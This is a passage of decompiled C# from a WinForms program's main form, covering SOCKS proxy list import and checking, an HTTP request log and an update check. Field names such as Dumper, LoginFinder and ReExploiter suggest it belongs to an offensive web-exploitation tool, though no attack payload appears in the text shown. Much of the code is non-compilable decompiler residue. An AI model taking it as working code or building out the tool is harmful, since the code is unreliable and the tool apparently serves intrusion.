	private void method_192(object sender, CancelEventArgs e)
	{
		e.Cancel = (this.dtgSocks.Rows.Count == 0);
		this.mnuSocksSelectAll.Enabled = (this.dtgSocks.Rows.Count > 1);
		this.mnuSocksRemove.Enabled = (this.dtgSocks.SelectedRows.Count >= 1);
		this.mnuSocksCheck.Enabled = (this.dtgSocks.Rows.Count >= 1);
		this.mnuSocksUnCheck.Enabled = (this.dtgSocks.Rows.Count >= 1);
	}

	// Token: 0x06000F74 RID: 3956 RVA: 0x000087D7 File Offset: 0x000069D7
	private void method_193(object sender, EventArgs e)
	{
		this.dtgSocks.SelectAll();
	}

	// Token: 0x06000F75 RID: 3957 RVA: 0x0006BC10 File Offset: 0x00069E10
	private void method_194(object sender, EventArgs e)
	{
		int num;
		int num4;
		object obj2;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			if (this.dtgSocks.SelectedRows.Count == 0)
			{
				goto IL_9E;
			}
			IL_21:
			num2 = 4;
			List<string> list = new List<string>();
			IL_29:
			num2 = 5;
			IEnumerator enumerator = this.dtgSocks.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				object obj = enumerator.Current;
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				IL_4B:
				num2 = 6;
				Class35.Class36 @class = (Class35.Class36)dataGridViewRow.Tag;
				IL_5B:
				num2 = 7;
				list.Add(@class.method_1(false));
				IL_6B:
				num2 = 8;
			}
			IL_75:
			num2 = 9;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
			IL_8B:
			num2 = 10;
			global::Globals.G_SOCKS.method_4(list.ToArray());
			IL_9E:
			goto IL_128;
			IL_A3:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_DF:
			goto IL_11D;
			IL_E1:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_FA:;
		}
		catch when (endfilter(obj2 is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj3;
			goto IL_E1;
		}
		IL_11D:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_128:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F76 RID: 3958 RVA: 0x0006BD60 File Offset: 0x00069F60
	private void method_195(object sender, EventArgs e)
	{
		try
		{
			foreach (object obj in ((IEnumerable)this.dtgSocks.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				dataGridViewRow.Cells[0].Value = true;
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x06000F77 RID: 3959 RVA: 0x0006BDD4 File Offset: 0x00069FD4
	private void method_196(object sender, EventArgs e)
	{
		try
		{
			foreach (object obj in ((IEnumerable)this.dtgSocks.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				dataGridViewRow.Cells[0].Value = false;
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x06000F78 RID: 3960 RVA: 0x0006BE48 File Offset: 0x0006A048
	private void method_197(object sender, EventArgs e)
	{
		using (NewSocks newSocks = new NewSocks())
		{
			newSocks.ShowDialog(this);
		}
	}

	// Token: 0x06000F79 RID: 3961 RVA: 0x0006BE80 File Offset: 0x0006A080
	private void method_198(object sender, EventArgs e)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			using (SocksCheck socksCheck = new SocksCheck())
			{
				socksCheck.arrayList_0.AddRange(global::Globals.G_SOCKS.method_8());
				socksCheck.Text = global::Globals.translate_0.GetStr(this, 65, "");
				if (socksCheck.arrayList_0.Count == 0)
				{
					this.method_1(global::Globals.translate_0.GetStr(this, 66, ""));
					Interaction.Beep();
				}
				else
				{
					socksCheck.ShowDialog(this);
					global::Globals.LockWindowUpdate(this.dtgSocks.Handle);
					if (socksCheck.DialogResult == DialogResult.OK)
					{
						global::Globals.G_SOCKS.method_4((string[])socksCheck.arrayList_2.ToArray(typeof(string)));
					}
					global::Globals.LockWindowUpdate(IntPtr.Zero);
					socksCheck.Dispose();
				}
			}
			IL_D3:
			goto IL_136;
			IL_D5:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_EF:
			goto IL_12B;
			IL_F1:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_109:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_F1;
		}
		IL_12B:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_136:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F7A RID: 3962 RVA: 0x000087E4 File Offset: 0x000069E4
	private void method_199(object sender, EventArgs e)
	{
		global::Globals.G_SOCKS.method_7();
	}

	// Token: 0x06000F7B RID: 3963 RVA: 0x0006C000 File Offset: 0x0006A200
	private void method_200(object sender, EventArgs e)
	{
		try
		{
			string text;
			if (sender == this.btnSocksAppend)
			{
				if (Clipboard.ContainsText())
				{
					text = Clipboard.GetText();
				}
			}
			else
			{
				string url;
				using (ImpBox impBox = new ImpBox())
				{
					impBox.MinLengh = 5;
					impBox.txtValue.MaxLength = 1024;
					impBox.Text = this.btnSocksUrl.Text;
					impBox.txtValue.Text = Class50.smethod_5(base.Name, "ProxyURL", "", null);
					if (impBox.ShowDialog(this) == DialogResult.OK)
					{
						url = impBox.txtValue.Text.Trim();
					}
				}
				Http http = new Http();
				http.UserAgent = Conversions.ToString(global::Globals.GetObjectValue(global::Globals.GMain.txtUserAgent));
				http.Accept = Conversions.ToString(global::Globals.GetObjectValue(global::Globals.GMain.txtAccept));
				http.ConnectTimeout = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.numHTTPTimeout));
				http.ReadTimeout = http.ConnectTimeout;
				http.FollowRedirects = true;
				http.AutoAddHostHeader = true;
				http.AllowGzip = true;
				http.SendCookies = true;
				http.SaveCookies = true;
				http.CookieDir = "memory";
				http.UseIEProxy = false;
				text = http.QuickGetStr(url);
				if (!string.IsNullOrEmpty(text))
				{
					text = Class23.smethod_5(text);
					text = text.Replace(" ", "");
					Match match = Regex.Match(text, "([1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}:(\\d+))", RegexOptions.IgnoreCase);
					if (!match.Success)
					{
						match = Regex.Match(text, ">(\\d+)<", RegexOptions.IgnoreCase);
						if (match.Success)
						{
							match = Regex.Match(text, "([1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2})|>(\\d+)<", RegexOptions.IgnoreCase);
							if (match.Success)
							{
								text = "";
								while (match.Success)
								{
									try
									{
										text = text + match.Value + "\t";
									}
									catch (Exception ex)
									{
									}
									match = match.NextMatch();
								}
								text = text.Replace("<", "");
								text = text.Replace(">", "");
							}
						}
					}
				}
				http.Dispose();
				Class50.smethod_4(base.Name, "ProxyURL", url, null);
			}
			if (!string.IsNullOrEmpty(text))
			{
				text = text.Replace("\t\t", "\t");
				text = text.Replace("\t", ":");
				text = text.Replace("*", "");
				text = text.Replace(" ", "");
				Match match = Regex.Match(text, "([1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}:(\\d+))", RegexOptions.IgnoreCase);
				int value;
				if (match.Success)
				{
					using (ProxyType proxyType = new ProxyType())
					{
						proxyType.ShowDialog(this);
						if (proxyType.DialogResult != DialogResult.OK)
						{
							return;
						}
						switch (proxyType.cmbProxy.SelectedIndex)
						{
						case 0:
							value = 0;
							break;
						case 1:
							value = 4;
							break;
						case 2:
							value = 5;
							break;
						}
					}
				}
				global::Globals.LockWindowUpdate(this.dtgSocks.Handle);
				while (match.Success)
				{
					try
					{
						global::Globals.G_SOCKS.method_3(match.Value + ":" + Conversions.ToString(value));
					}
					catch (Exception ex2)
					{
					}
					match = match.NextMatch();
				}
				global::Globals.LockWindowUpdate(IntPtr.Zero);
			}
		}
		catch (Exception ex3)
		{
			MessageBox.Show(ex3.Message);
		}
	}

	// Token: 0x06000F7C RID: 3964 RVA: 0x0006C3F0 File Offset: 0x0006A5F0
	private string method_201(string string_5)
	{
		Regex regex = new Regex(">(\\\\S+)<", RegexOptions.IgnoreCase | RegexOptions.Compiled);
		Match match = regex.Match(string_5);
		System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
		if (!match.Success)
		{
			stringBuilder.Append(string_5);
		}
		else
		{
			while (match.Success)
			{
				stringBuilder.Append(match.Value + "\t");
				match = match.NextMatch();
			}
		}
		return stringBuilder.ToString();
	}

	// Token: 0x06000F7D RID: 3965 RVA: 0x0006C45C File Offset: 0x0006A65C
	private void method_202(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText(this.lvwHttpLog.SelectedRows[0].Cells[1].Value.ToString());
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000F7E RID: 3966 RVA: 0x000087F0 File Offset: 0x000069F0
	private void method_203(object sender, EventArgs e)
	{
		global::Globals.ShellUrl(this.lvwHttpLog.SelectedRows[0].Cells[1].Value.ToString());
	}

	// Token: 0x06000F7F RID: 3967 RVA: 0x0006C4B4 File Offset: 0x0006A6B4
	private void method_204(object sender, EventArgs e)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			this.lvwHttpLog.Rows.Clear();
			IL_1C:
			goto IL_7F;
			IL_1E:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_38:
			goto IL_74;
			IL_3A:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_52:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_3A;
		}
		IL_74:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_7F:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F80 RID: 3968 RVA: 0x0000881D File Offset: 0x00006A1D
	private void method_205(object sender, EventArgs e)
	{
		this.bool_4 = this.mnuHttpLogAutoScroll.Checked;
		this.mnuHttpLog.ShowCheckMargin = this.bool_4;
	}

	// Token: 0x06000F81 RID: 3969 RVA: 0x0006C558 File Offset: 0x0006A758
	private void toolStripButton_3_CheckedChanged(object sender, EventArgs e)
	{
		global::Globals.LockWindowUpdate(base.Handle);
		if (!((ToolStripButton)sender).Checked)
		{
			this.method_204(null, null);
		}
		this.grbHttpLog.Visible = ((ToolStripButton)sender).Checked;
		global::Globals.LockWindowUpdate(IntPtr.Zero);
	}

	// Token: 0x06000F82 RID: 3970 RVA: 0x0006C5AC File Offset: 0x0006A7AC
	internal void method_206(long long_0, string string_5, string string_6, string string_7, string string_8, string string_9)
	{
		if (this.lvwHttpLog.InvokeRequired)
		{
			this.lvwHttpLog.Invoke(new MainForm.Delegate52(this.method_206), new object[]
			{
				long_0,
				string_5,
				string_6,
				string_7,
				string_8,
				string_9
			});
		}
		else
		{
			try
			{
				if (long_0 >= 0L)
				{
					try
					{
						foreach (object obj in ((IEnumerable)this.lvwHttpLog.Rows))
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							if (dataGridViewRow.Cells[0].Value.Equals(long_0))
							{
								dataGridViewRow.Cells[2].Value = string_6;
								dataGridViewRow.Cells[3].Value = string_7;
								dataGridViewRow.Cells[4].Value = string_8;
								dataGridViewRow.Tag = string_9;
								break;
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
			catch (Exception ex)
			{
				Interaction.MsgBox(ex.ToString(), MsgBoxStyle.OkOnly, null);
			}
		}
	}

	// Token: 0x06000F83 RID: 3971 RVA: 0x0006C6F0 File Offset: 0x0006A8F0
	internal long method_207(string string_5, string string_6)
	{
		checked
		{
			long result;
			if (base.InvokeRequired)
			{
				result = Conversions.ToLong(base.Invoke(new MainForm.Delegate51(this.method_207), new object[]
				{
					string_5,
					string_6
				}));
			}
			else
			{
				long ticks = DateAndTime.Now.Ticks;
				if (this.toolStripButton_3.Checked)
				{
					if (this.$STATIC$AddLog$202AEE$iCount$Init == null)
					{
						Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$AddLog$202AEE$iCount$Init, new StaticLocalInitFlag(), null);
					}
					bool flag = false;
					try
					{
						Monitor.Enter(this.$STATIC$AddLog$202AEE$iCount$Init, ref flag);
						if (this.$STATIC$AddLog$202AEE$iCount$Init.State == 0)
						{
							this.$STATIC$AddLog$202AEE$iCount$Init.State = 2;
							this.$STATIC$AddLog$202AEE$iCount = 0;
						}
						else if (this.$STATIC$AddLog$202AEE$iCount$Init.State == 2)
						{
							throw new IncompleteInitialization();
						}
					}
					finally
					{
						this.$STATIC$AddLog$202AEE$iCount$Init.State = 1;
						if (flag)
						{
							Monitor.Exit(this.$STATIC$AddLog$202AEE$iCount$Init);
						}
					}
					if (this.$STATIC$AddLog$202AEE$iSkiped$Init == null)
					{
						Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$AddLog$202AEE$iSkiped$Init, new StaticLocalInitFlag(), null);
					}
					bool flag2 = false;
					try
					{
						Monitor.Enter(this.$STATIC$AddLog$202AEE$iSkiped$Init, ref flag2);
						if (this.$STATIC$AddLog$202AEE$iSkiped$Init.State == 0)
						{
							this.$STATIC$AddLog$202AEE$iSkiped$Init.State = 2;
							this.$STATIC$AddLog$202AEE$iSkiped = 0;
						}
						else if (this.$STATIC$AddLog$202AEE$iSkiped$Init.State == 2)
						{
							throw new IncompleteInitialization();
						}
					}
					finally
					{
						this.$STATIC$AddLog$202AEE$iSkiped$Init.State = 1;
						if (flag2)
						{
							Monitor.Exit(this.$STATIC$AddLog$202AEE$iSkiped$Init);
						}
					}
					object obj = this.stopwatch_0;
					lock (obj)
					{
						if (this.stopwatch_0.ElapsedMilliseconds < 1000L)
						{
							this.$STATIC$AddLog$202AEE$iCount++;
							if (this.$STATIC$AddLog$202AEE$iCount > 15)
							{
								this.$STATIC$AddLog$202AEE$iSkiped++;
								return -1L;
							}
						}
						else
						{
							this.$STATIC$AddLog$202AEE$iCount = 0;
							this.stopwatch_0 = Stopwatch.StartNew();
						}
						if (this.$STATIC$AddLog$202AEE$iSkiped > 1)
						{
							this.lvwHttpLog.Rows.Add(new object[]
							{
								0,
								string.Concat(new string[]
								{
									"         ",
									Conversions.ToString(this.$STATIC$AddLog$202AEE$iSkiped),
									" ",
									global::Globals.translate_0.GetStr(this, 67, ""),
									" ",
									Conversions.ToString(100),
									global::Globals.translate_0.GetStr(this, 68, "")
								}),
								"",
								"",
								"",
								""
							});
							this.$STATIC$AddLog$202AEE$iSkiped = 0;
						}
						this.lvwHttpLog.Rows.Add(new object[]
						{
							ticks,
							string_5,
							"",
							"",
							"Connecting..",
							string_6
						});
						if (this.bool_4)
						{
							this.lvwHttpLog.FirstDisplayedScrollingRowIndex = this.lvwHttpLog.Rows.Count - 1;
						}
						result = ticks;
					}
				}
			}
			return result;
		}
	}

	// Token: 0x06000F84 RID: 3972 RVA: 0x0006CA34 File Offset: 0x0006AC34
	private void method_208(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				global::Globals.LockWindowUpdate(base.Handle);
				this.toolStripButton_3.Visible = false;
				this.grbHttpLog.Visible = false;
				HttpLog httpLog = new HttpLog(this.toolStripButton_3, this.grbHttpLog, this.lvwHttpLog);
				httpLog.Controls.Add(this.lvwHttpLog);
				httpLog.Top = (int)Math.Round(unchecked((double)global::Globals.GMain.Top + (double)global::Globals.GMain.Height / 2.0 - (double)httpLog.Height / 2.0));
				httpLog.Left = (int)Math.Round(unchecked((double)global::Globals.GMain.Left + (double)global::Globals.GMain.Width / 2.0 - (double)httpLog.Width / 2.0));
				httpLog.Show(this);
				global::Globals.LockWindowUpdate(IntPtr.Zero);
			}
			catch (Exception ex)
			{
				Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
			}
		}
	}

	// Token: 0x06000F85 RID: 3973 RVA: 0x0006CB50 File Offset: 0x0006AD50
	private void method_209(object sender, CancelEventArgs e)
	{
		this.mnuHttpLogDock.Visible = this.toolStripButton_3.Visible;
		if (this.lvwHttpLog.SelectedRows.Count == 1)
		{
			this.mnuHttpLogClipboard.Visible = this.lvwHttpLog.SelectedRows[0].Cells[1].Value.ToString().ToLower().Contains("http");
			this.mnuHttpLogShell.Visible = this.mnuHttpLogClipboard.Visible;
		}
		else
		{
			this.mnuHttpLogClipboard.Visible = false;
			this.mnuHttpLogShell.Visible = false;
		}
	}

	// Token: 0x06000F86 RID: 3974 RVA: 0x00008841 File Offset: 0x00006A41
	private void method_210(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			this.mnuDownloads.Show(Control.MousePosition);
		}
	}

	// Token: 0x06000F87 RID: 3975 RVA: 0x000027EC File Offset: 0x000009EC
	private void method_211(object sender, EventArgs e)
	{
	}

	// Token: 0x06000F88 RID: 3976 RVA: 0x0006CBF8 File Offset: 0x0006ADF8
	private void method_212()
	{
		global::Globals.GUpdater = new Updater();
		bool flag;
		if (this.chkUpdater.Checked)
		{
			switch (this.cmbUpdater.SelectedIndex)
			{
			case 0:
				flag = true;
				break;
			case 1:
			case 2:
			{
				DateTime value;
				if (DateTime.TryParse(Class50.smethod_5("Update", "LastCheck", "", null), out value))
				{
					int num;
					if (this.cmbUpdater.SelectedIndex == 1)
					{
						num = 7;
					}
					else
					{
						num = 30;
					}
					if (DateTime.Now.Subtract(value).TotalDays >= (double)num)
					{
						flag = true;
					}
				}
				else
				{
					flag = true;
				}
				break;
			}
			}
		}
		if (flag)
		{
			Class50.smethod_4("Update", "LastCheck", DateTime.Now.ToString(), null);
			global::Globals.GUpdater.Check(false);
		}
	}

	// Token: 0x06000F89 RID: 3977 RVA: 0x0006CCCC File Offset: 0x0006AECC
	private void method_213(object sender, EventArgs e)
	{
		this.Cursor = Cursors.WaitCursor;
		Application.DoEvents();
		Class50.smethod_4("Update", "LastCheck", DateTime.Now.ToString(), null);
		global::Globals.GUpdater.Check(true);
		this.Cursor = Cursors.Default;
	}

	// Token: 0x06000F8A RID: 3978 RVA: 0x00008862 File Offset: 0x00006A62
	[DebuggerHidden]
	[CompilerGenerated]
	private bool method_214()
	{
		return this.method_22(-1);
	}

	// Token: 0x06000F8B RID: 3979 RVA: 0x0000886B File Offset: 0x00006A6B
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_215(object object_0)
	{
		this.method_30((global::Globals.SearchHost)Conversions.ToByte(object_0));
	}

	// Token: 0x06000F8C RID: 3980 RVA: 0x00008879 File Offset: 0x00006A79
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_216(object object_0)
	{
		this.method_36((Class25)object_0);
	}

	// Token: 0x06000F8D RID: 3981 RVA: 0x00008879 File Offset: 0x00006A79
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_217(object object_0)
	{
		this.method_36((Class25)object_0);
	}

	// Token: 0x06000F8E RID: 3982 RVA: 0x00008887 File Offset: 0x00006A87
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_218(object object_0)
	{
		this.method_48((MainForm.Class49)object_0);
	}

	// Token: 0x06000F8F RID: 3983 RVA: 0x00008895 File Offset: 0x00006A95
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_219(object object_0)
	{
		this.method_46((MainForm.Class49)object_0);
	}

	// Token: 0x06000F90 RID: 3984 RVA: 0x000082D6 File Offset: 0x000064D6
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_220(object sender, EventArgs e)
	{
		this.method_72();
	}

	// Token: 0x06000F91 RID: 3985 RVA: 0x000082D6 File Offset: 0x000064D6
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_221(object sender, EventArgs e)
	{
		this.method_72();
	}

	// Token: 0x040005FB RID: 1531
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("tslNotepad")]
	private ToolStrip toolStrip_0;

	// Token: 0x040005FC RID: 1532
	[AccessedThroughProperty("btnNotepadOpen")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripButton toolStripButton_0;

	// Token: 0x040005FD RID: 1533
	[CompilerGenerated]
	[AccessedThroughProperty("toolStripSeparator5")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x040005FE RID: 1534
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnNotepadSave")]
	[CompilerGenerated]
	private ToolStripButton toolStripButton_1;

	// Token: 0x040005FF RID: 1535
	[CompilerGenerated]
	[AccessedThroughProperty("toolStripSeparator7")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x04000600 RID: 1536
	[CompilerGenerated]
	[AccessedThroughProperty("btnNotepadClear")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton toolStripButton_2;

	// Token: 0x04000601 RID: 1537
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripLabel3")]
	private ToolStripLabel toolStripLabel_0;

	// Token: 0x04000607 RID: 1543
	[AccessedThroughProperty("mnuListView")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuChecked;

	// Token: 0x0400060D RID: 1549
	[AccessedThroughProperty("imgData")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ImageList imageList_0;

	// Token: 0x0400060E RID: 1550
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("bcWorker")]
	[CompilerGenerated]
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x04000617 RID: 1559
	[AccessedThroughProperty("mnuSocks")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuChecked_1;

	// Token: 0x04000623 RID: 1571
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuAbout")]
	private ContextMenuStrip _mnuChecked_3;

	// Token: 0x0400062F RID: 1583
	[AccessedThroughProperty("mnuHttpLog")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuChecked_6;

	// Token: 0x04000636 RID: 1590
	[CompilerGenerated]
	[AccessedThroughProperty("mnuQueue")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuChecked_4;

	// Token: 0x0400063F RID: 1599
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuExcludeUrlWords")]
	[CompilerGenerated]
	private ContextMenuStrip _mnuChecked_2;

	// Token: 0x04000649 RID: 1609
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("VisualStyler1")]
	private VisualStyler visualStyler_0;

	// Token: 0x04000656 RID: 1622
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuTrash")]
	private ContextMenuStrip _mnuChecked_5;

	// Token: 0x04000662 RID: 1634
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("ntfTray")]
	private NotifyIcon notifyIcon_0;

	// Token: 0x04000673 RID: 1651
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ColumnHeader5")]
	[CompilerGenerated]
	private ColumnHeader columnHeader_0;

	// Token: 0x04000674 RID: 1652
	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader7")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_1;

	// Token: 0x04000676 RID: 1654
	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader8")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_2;

	// Token: 0x04000677 RID: 1655
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ColumnHeader9")]
	private ColumnHeader columnHeader_3;

	// Token: 0x04000678 RID: 1656
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuPaths")]
	private ContextMenuStrip _mnuChecked_7;

	// Token: 0x04000688 RID: 1672
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ColumnHeader11")]
	[CompilerGenerated]
	private ColumnHeader columnHeader_4;

	// Token: 0x04000689 RID: 1673
	[AccessedThroughProperty("ColumnHeader12")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ColumnHeader columnHeader_5;

	// Token: 0x040006B2 RID: 1714
	[AccessedThroughProperty("mnuSearchColumn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ContextMenuStrip _mnuChecked_9;

	// Token: 0x040006B9 RID: 1721
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuDownloads")]
	private ContextMenuStrip _mnuChecked_10;

	// Token: 0x040006EA RID: 1770
	[AccessedThroughProperty("ColumnHeader32")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ColumnHeader columnHeader_6;

	// Token: 0x040006EB RID: 1771
	[AccessedThroughProperty("ColumnHeader33")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ColumnHeader columnHeader_7;

	// Token: 0x040006EC RID: 1772
	[AccessedThroughProperty("mnuScannerDomain")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ContextMenuStrip _mnuChecked_8;

	// Token: 0x040006F4 RID: 1780
	[AccessedThroughProperty("ColumnHeader34")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_8;

	// Token: 0x040006F5 RID: 1781
	[AccessedThroughProperty("ColumnHeader35")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_9;

	// Token: 0x04000704 RID: 1796
	[AccessedThroughProperty("bckAlexa")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private BackgroundWorker backgroundWorker_1;

	// Token: 0x0400070B RID: 1803
	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader36")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_10;

	// Token: 0x0400070C RID: 1804
	[AccessedThroughProperty("ColumnHeader37")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_11;

	// Token: 0x0400070D RID: 1805
	[AccessedThroughProperty("bckImport")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private BackgroundWorker backgroundWorker_2;

	// Token: 0x04000720 RID: 1824
	[AccessedThroughProperty("ID")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn_0;

	// Token: 0x0400073C RID: 1852
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("imlTree")]
	private ImageList imageList_1;

	// Token: 0x04000760 RID: 1888
	private global::ThreadPool threadPool_0;

	// Token: 0x04000761 RID: 1889
	private Dictionary<global::Globals.SearchHost, SearchEngine> dictionary_0;

	// Token: 0x04000762 RID: 1890
	private List<string> list_0;

	// Token: 0x04000763 RID: 1891
	private MainForm.Enum6 enum6_0;

	// Token: 0x04000764 RID: 1892
	private int int_0;

	// Token: 0x04000765 RID: 1893
	private int int_1;

	// Token: 0x04000766 RID: 1894
	private int int_2;

	// Token: 0x04000767 RID: 1895
	private int int_3;

	// Token: 0x04000768 RID: 1896
	private string string_0;

	// Token: 0x04000769 RID: 1897
	private int int_4;

	// Token: 0x0400076A RID: 1898
	private List<string> list_1;

	// Token: 0x0400076B RID: 1899
	private bool bool_0;

	// Token: 0x0400076C RID: 1900
	public AppDomainControl AppControlDomain;

	// Token: 0x0400076D RID: 1901
	public Dumper DumperForm;

	// Token: 0x0400076E RID: 1902
	public LoginFinder LoginFinderForm;

	// Token: 0x0400076F RID: 1903
	public Analizer AnalizerForm;

	// Token: 0x04000770 RID: 1904
	public ReExploiter ReExploiterForm;

	// Token: 0x04000771 RID: 1905
	private static bool bool_1;

	// Token: 0x04000772 RID: 1906
	public static byte[] DLL_HTTP;

	// Token: 0x04000773 RID: 1907
	internal bool bool_2;

	// Token: 0x04000774 RID: 1908
	internal bool bool_3;

